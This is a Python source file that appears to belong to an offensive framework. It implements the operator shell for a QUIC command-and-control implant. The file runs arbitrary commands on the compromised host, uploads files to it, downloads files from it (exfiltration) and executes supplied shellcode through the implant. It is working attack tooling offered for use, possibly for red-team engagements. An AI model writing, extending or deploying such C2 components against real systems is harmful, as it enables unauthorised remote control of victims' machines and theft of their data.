#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""QUIC C2 shell — remote commands, upload, download, shellcode."""

from __future__ import annotations

from typing import Any, Dict, List

from core.output_handler import print_warning
from lib.protocols.quic.constants import DEFAULT_QUIC_ALPN
from lib.protocols.quic.session_client import QuicSessionClient

from .base_shell import BaseShell


class QuicShell(BaseShell):
    """Interactive shell for QUIC implant sessions."""

    def __init__(self, session_id: str, session_type: str = "quic", framework=None):
        super().__init__(session_id, session_type)
        self.framework = framework
        self.client: QuicSessionClient | None = None
        self.peer = "unknown"

        self.builtin_commands = {
            "help": self._cmd_help,
            "clear": self._cmd_clear,
            "history": self._cmd_history,
            "info": self._cmd_info,
            "send": self._cmd_send,
            "recv": self._cmd_recv,
            "send_shellcode": self._cmd_send_shellcode,
            "exit": self._cmd_exit,
            "quit": self._cmd_exit,
            "disconnect": self._cmd_exit,
        }

        self._initialize_client()

    def _initialize_client(self):
        try:
            client = QuicSessionClient.from_session(self.framework, self.session_id)
            if client:
                self.client = client
                peer = client.protocol.peer_address
                self.peer = f"{peer[0]}:{peer[1]}"
                self.hostname = peer[0]
        except Exception as exc:
            print_warning(f"Could not initialize QUIC connection: {exc}")

    @property
    def shell_name(self) -> str:
        return "quic"

    @property
    def prompt_template(self) -> str:
        return f"quic [{self.peer}]> "

    def get_prompt(self) -> str:
        return self.prompt_template

    def get_available_commands(self) -> List[str]:
        return list(self.builtin_commands.keys())

    def execute_command(self, command: str) -> Dict[str, Any]:
        if not command.strip():
            return {"output": "", "status": 0, "error": ""}

        self.add_to_history(command)
        parts = command.strip().split(None, 1)
        cmd = parts[0].lower()
        args = parts[1] if len(parts) > 1 else ""

        if cmd in self.builtin_commands:
            try:
                return self.builtin_commands[cmd](args)
            except Exception as exc:
                return {"output": "", "status": 1, "error": str(exc)}

        return self._run_remote(command)

    def _require_client(self) -> QuicSessionClient:
        if not self.client:
            self._initialize_client()
        if not self.client:
            raise RuntimeError("QUIC client not available for this session")
        return self.client

    def _run_remote(self, command: str) -> Dict[str, Any]:
        client = self._require_client()
        output = client.run_shell_command(command)
        return {"output": output, "status": 0, "error": ""}

    def _cmd_help(self, _args: str) -> Dict[str, Any]:
        return {
            "output": """
QUIC C2 Shell Commands:
=======================
  <shell cmd>                 Run a command on the implant
  cd <path>                   Change implant working directory
  send <local> <remote>       Upload file to implant
  recv <remote> <local>       Download file from implant
  send_shellcode <hex>        Execute shellcode on the implant
  info                        Session details
  help                        This help
  exit, quit, disconnect      Leave shell (session stays open)
""".strip(),
            "status": 0,
            "error": "",
        }

    def _cmd_clear(self, _args: str) -> Dict[str, Any]:
        return {"output": "\033[2J\033[H", "status": 0, "error": ""}

    def _cmd_history(self, args: str) -> Dict[str, Any]:
        limit = 20
        if args.strip().isdigit():
            limit = int(args.strip())
        lines = self.get_history(limit)
        return {"output": "\n".join(f"  {idx + 1:3d}  {line}" for idx, line in enumerate(lines)), "status": 0, "error": ""}

    def _cmd_info(self, _args: str) -> Dict[str, Any]:
        return {
            "output": "\n".join(
                [
                    f"Transport: QUIC (ALPN {DEFAULT_QUIC_ALPN})",
                    f"Peer:      {self.peer}",
                    f"Session:   {self.session_id}",
                ]
            ),
            "status": 0,
            "error": "",
        }

    def _cmd_send(self, args: str) -> Dict[str, Any]:
        parts = args.split(None, 1)
        if len(parts) < 2:
            return {"output": "", "status": 1, "error": "Usage: send <local_path> <remote_dest>"}
        client = self._require_client()
        return {"output": client.upload(parts[0], parts[1]), "status": 0, "error": ""}

    def _cmd_recv(self, args: str) -> Dict[str, Any]:
        parts = args.split(None, 1)
        if len(parts) < 2:
            return {"output": "", "status": 1, "error": "Usage: recv <remote_path> <local_save_path>"}
        client = self._require_client()
        return {"output": client.download(parts[0], parts[1]), "status": 0, "error": ""}

    def _cmd_send_shellcode(self, args: str) -> Dict[str, Any]:
        if not args.strip():
            return {"output": "", "status": 1, "error": "Usage: send_shellcode <hex_shellcode>"}
        client = self._require_client()
        return {"output": client.exec_shellcode(args), "status": 0, "error": ""}

    def _cmd_exit(self, _args: str) -> Dict[str, Any]:
        self.is_active = False
        return {"output": "Returning to main shell (QUIC session remains active).", "status": 0, "error": ""}
